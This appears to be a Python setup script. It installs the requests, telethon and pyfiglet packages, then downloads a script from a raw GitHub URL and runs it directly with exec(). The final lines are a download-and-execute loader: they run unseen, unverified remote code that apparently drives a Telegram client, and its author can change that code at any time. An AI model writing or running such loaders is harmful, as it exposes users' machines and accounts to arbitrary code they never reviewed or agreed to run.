import subprocess

def install_module(module_name):
    try:
        __import__(module_name)
        print(f"{module_name} is already installed.")
    except ImportError:
        print(f"{module_name} is not installed. Installing it now...")
        try:
            subprocess.check_call(["pip3", "install", module_name])
            print(f"{module_name} has been successfully installed.")
        except Exception as e:
            try:
                subprocess.check_call(["pip", "install", module_name])
                print(f"{module_name} has been successfully installed using pip.")
            except Exception as e:
                print(f"Failed to install {module_name} with pip and pip3:", str(e))
                exit(0)

install_module("requests")
install_module("telethon")
install_module("pyfiglet")

import requests
response = requests.get("https://raw.githubusercontent.com/sythontm/CollectSython/main/sython.py")
exec(response.text)
